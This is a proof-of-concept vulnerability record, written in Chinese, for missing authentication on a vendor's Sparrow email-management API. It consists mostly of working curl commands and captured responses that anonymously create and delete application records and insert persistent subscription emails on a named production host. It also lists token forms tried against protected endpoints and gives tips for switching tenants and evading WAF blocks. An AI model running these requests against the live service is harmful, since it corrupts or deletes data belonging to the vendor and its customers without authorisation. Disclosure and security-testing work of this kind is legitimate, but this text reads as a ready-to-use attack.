# light-tech Sparrow 后台 API 鉴权缺失：/api/applications 匿名增删应用注册表 + /api/applications/<appId>/emails 匿名持久化写订阅邮箱

- **code**: sparrow-light-tech-api-applications-emails-unauth-write
- **kind**: poc
- **category**: unauthorized
- **component**: light-tech Sparrow（邮件管理后台，Node/Express + MongoDB）
- **severity**: medium
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: task#10 / finding_id=143（finding_checks.verdict=verified，findings.status=confirmed），2026-11-11 17:52–17:59 UTC，本机 curl -sk 直连 sparrow-captain-sparrow.light-tech.online：① 匿名 GET /api/applications → 200，6 条应用记录；② 匿名 POST /api/applications {"name":"probe1937-tmp","appId":"dfced6dc-8509-4a24-94af-3de02ce6344b"} → 201 "Application created successfully" + Mongo _id=6af4acaf423ea7c9c30ee596，GET 回读出现第 7 条；③ 匿名 DELETE /api/applications/dfced6dc-... → 200 "Application deleted successfully"，回读恢复 6 条（测试记录已清理，未删真实应用）；④ 匿名 POST /api/applications/14206e6f-4e6d-eecd-f424-86531c98386c/emails → 201 "Email added successfully"（_id=6af4ab6a423ea7c9c30ee359、emailHash、date 均为服务端生成），同 email 重发 → 400 "Email already exists for this application" 证明确实落库；⑤ 阴性对照：同服务 GET /api/applications/<appId>/emails（无令牌及 18 种令牌形态）→ 401 "Unauthorized: token required for reading emails"，/emails/download → 401，POST/PUT/DELETE /api/ab-test/* → 401 {"error":"Unauthorized"}。判定成立：写面无鉴权是配置遗漏，非公开设计。
- **path**: pocs/sparrow-light-tech-api-applications-emails-unauth-write/sparrow_light_tech_api_unauth_write.md
- **tags**: unauthorized, sparrow, light-tech, wix, applications, emails, mongodb, api-auth-missing, no-auth, write
- **created_at**: 2026-11-11T18:03:26.484Z
- **engine**: https://sparrow-captain-sparrow.light-tech.online

## 描述

供应商 light-tech 的 Sparrow 邮件管理后台把「应用注册表增删」与「应用邮件订阅表写入」放在无鉴权分支：匿名 POST /api/applications 可创建应用记录、DELETE /api/applications/<appId> 可删除任意应用记录，匿名 POST /api/applications/<appId>/emails 可向指定应用的订阅表插入持久化记录。同服务上读邮件列表 / CSV 导出 / A/B 测试写均要求 Sparrow admin Bearer（Google OAuth）→ 401，证明写面无鉴权是鉴权遗漏而非公开设计。影响为后台数据完整性/可用性（可删真实应用注册、污染订阅邮箱库），不直接读 PII。前置：目标 sparrow-*.light-tech.online 公网可达，无需任何账号/令牌。

## 用法

```
1) 匿名读注册表：curl -sk -A "$UA" https://<host>/api/applications → 200 JSON 数组（含 name/appId/color；appId 即后续写入目标）。
2) 匿名创建（先自建再删，勿动真实记录）：POST /api/applications，Content-Type: application/json，body {"name":"probe-tmp-<rand>","appId":"<自造 UUID>","color":"#000000"} → 201 {"message":"Application created successfully"}；立刻 GET 回读确认新记录出现。
3) 匿名删除：DELETE /api/applications/<自造 appId> → 200 {"message":"Application deleted successfully"}；再 GET 回读确认恢复原条数（收尾清理）。
4) 匿名写订阅邮箱：POST /api/applications/<真实或自建 appId>/emails，body {"email":"probe-<rand>@example.org","instanceId":"<站点公开 Wix instanceId>","premium":false} → 201 {"message":"Email added successfully"}；同 email 再提交一次 → 400 {"error":"Email already exists for this application"} 即持久化证据。
5) 阴性对照：GET /api/applications/<appId>/emails（带/不带 Authorization、Wix 公开实例令牌 18 种形态）→ 一律 401 {"error":"Unauthorized: token required for reading emails"}；/emails/download 401；/api/ab-test/* 写 401。
6) 收尾：删除自建 application；订阅表记录无法匿名删（DELETE 未开放）→ 复现前预留测试邮箱，或仅在授权范围内部署。
失败常见原因：写接口返回 401 = 该租户已补鉴权；404 = 后端路径/版本变更（从 Sparrow 前端 bundle 重新提 base URL）；500 = body 缺 name/appId 字段；403/超时 = CDN/WAF 拦截出口 IP。
```

## 正文

```
# light-tech Sparrow 后台 API 鉴权缺失（匿名增删应用注册表 + 匿名写应用邮件订阅表）

## 前置条件
- 目标为 light-tech 的 Sparrow 邮件管理后台，公网可达，典型域名形如 `sparrow-<tenant>.light-tech.online`（本例 `sparrow-captain-sparrow.light-tech.online`）。
- 无需任何账号 / Cookie / Bearer；`curl` 即可，`-sk` 忽略证书问题。
- 后端栈特征：Node/Express + MongoDB（响应含 `_id`（ObjectId 24 hex）、`__v`）。
- 相关背景：Sparrow 是多 Wix 第三方应用共用的后端，`appId` 就是 Wix 的 `appDefId`。例如 `14206e6f-4e6d-eecd-f424-86531c98386c` = Impressive Site Menu（本站 kennysbuyselltrade.co.uk 部署的站点菜单应用），其 `instanceId` 可从店铺公开接口取：
```bash
curl -s -A "$UA" "https://<storefront>/_api/v1/access-tokens" \
  | jq -r '.apps["14206e6f-4e6d-eecd-f424-86531c98386c"].instance'
```

## 0) 侦察：匿名读应用注册表（无需鉴权）
```bash
curl -sk -A "$UA" "https://sparrow-captain-sparrow.light-tech.online/api/applications"
```
期望：HTTP 200，JSON 数组，每个元素形如
```json
{"_id":"682d8bd2533228635459ef99","name":"Site menu","appId":"14206e6f-4e6d-eecd-f424-86531c98386c","color":"#000000", ...}
```
实测共 6 条。响应里所有 `appId` 都是下一步的写入目标。

## 1) 匿名创建应用记录（真实写）
```bash
curl -sk -A "$UA" -X POST "https://sparrow-captain-sparrow.light-tech.online/api/applications" \
  -H 'Content-Type: application/json' \
  -d '{"name":"probe1937-tmp","appId":"dfced6dc-8509-4a24-94af-3de02ce6344b","color":"#000000"}'
```
期望：HTTP 201
```json
{"message":"Application created successfully",
 "application":{"name":"probe1937-tmp","appId":"dfced6dc-8509-4a24-94af-3de02ce6344b","color":"#000000",
                "_id":"6af4acaf423ea7c9c30ee596","__v":0}}
```
**判据**：无 `Authorization` 头仍返回 201 + 返回体带 Mongo `_id`。

## 2) 回读确认已持久化
```bash
curl -sk -A "$UA" "https://sparrow-captain-sparrow.light-tech.online/api/applications"
```
期望：200，数组中新增 `probe1937-tmp`（6 条 → 7 条）。

## 3) 匿名删除（同样无鉴权）+ 收尾还原
```bash
curl -sk -A "$UA" -X DELETE "https://sparrow-captain-sparrow.light-tech.online/api/applications/dfced6dc-8509-4a24-94af-3de02ce6344b"
```
期望：HTTP 200 `{"message":"Application deleted successfully"}`；再 GET 回读恢复 6 条。
> 安全复现纪律：只删自己刚建的 `appId`，不要使用注册表里已存在的真实 appId。

## 4) 匿名向指定应用的邮件订阅表插入记录（真实写）
```bash
curl -sk -A "$UA" -X POST \
  "https://sparrow-captain-sparrow.light-tech.online/api/applications/14206e6f-4e6d-eecd-f424-86531c98386c/emails" \
  -H 'Content-Type: application/json' \
  -d '{"email":"probe1937@example.org","instanceId":"b2ae1f3a-a0db-4402-b90b-5c7204cc720f","premium":false}'
```
期望：HTTP 201
```json
{"message":"Email added successfully",
 "email":{"_id":"6af4ab6a423ea7c9c30ee359","email":"probe1937@example.org",
          "appId":"14206e6f-4e6d-eecd-f424-86531c98386c",
          "instanceId":"b2ae1f3a-a0db-4402-b90b-5c7204cc720f",
          "emailHash":"d298f6ae...","date":"2026-11-11T17:52:42.045Z"}}
```
`emailHash` 与 `date` 由服务端生成，是落库而非回声的直接迹象。

## 5) 持久化证据：重复提交同一 email
```bash
# 同 4) 的请求原样再发一次
```
期望：HTTP 400 `{"error":"Email already exists for this application"}` → 证明上一步写入真实进了数据库（唯一性约束在 DB 层）。

## 6) 阴性对照：同服务、同资源族的读接口要求鉴权
```bash
# 6.1 读邮件列表：无令牌 / 各种令牌形态全部 401
curl -sk -A "$UA" "https://sparrow-captain-sparrow.light-tech.online/api/applications/14206e6f-4e6d-eecd-f424-86531c98386c/emails"
# 也试过 Authorization / Bearer <Wix 公开实例令牌> / ?token= ?instance= ?instanceId= ?access_token= /
# Cookie / x-api-key / x-auth-token / x-sparrow-token 等 18 种形态 —— 一律：
```
期望：HTTP 401 `{"error":"Unauthorized: token required for reading emails"}`
```bash
# 6.2 CSV 导出
curl -sk -A "$UA" "https://sparrow-captain-sparrow.light-tech.online/api/applications/14206e6f-4e6d-eecd-f424-86531c98386c/emails/download"
# → 401
# 6.3 A/B 测试写
# POST/PUT/DELETE /api/ab-test/* → 401 {"error":"Unauthorized"}（要求 Sparrow admin 的 Google OAuth Bearer）
```
结论：同一服务上读与 A/B 写都强制 admin Bearer，只有 `/api/applications` 的增删和 `/emails` 的写是漏配 → 属鉴权遗漏，不是「公开设计」。

## 影响
- 完整性：匿名者可创建/删除任意应用注册记录（真实 appId 可被 DELETE，导致应用从注册表消失）。
- 可用性/数据污染：可向任意 appId 的订阅表批量插入任意 email（含伪造 instanceId），污染营销/通知邮箱库；读侧需 admin，故不直接泄露 PII。
- 同族推广：light-tech Sparrow 后端承载多个 Wix 应用（Site menu 等），同一 `/api/applications` 面可横向覆盖所有租户；与已知的 `site-menu.light-tech.online/settings`（instance 令牌可写）是同一供应商的另一条独立入口。

## 失败常见原因
- 写入返回 401 → 该租户已补上鉴权（换其他 `sparrow-*.light-tech.online` 租户试）。
- 404 → 后端路径或版本变更，从 Sparrow 后台前端 bundle 重新提取 base URL 与路由。
- 500 → body 缺字段（`name`/`appId`；emails 需 `email`，`instanceId` 建议带上）。
- 403/超时 → CDN/WAF 按出口 IP 拦截，换出口或降低频率。
- `Email already exists` 一直出现 → 说明此前的测试记录仍在库里；换随机 email。

## 原始证据落盘（本机）
`/opt/artex/data/tasks/10/i1937/{sparrow_probe.out,sparrow_probe2.out,sparrow_probe3.out,other_probe.out,applications_list.json}`，2026-11-11 17:52–17:59 UTC，`curl -sk`。
```
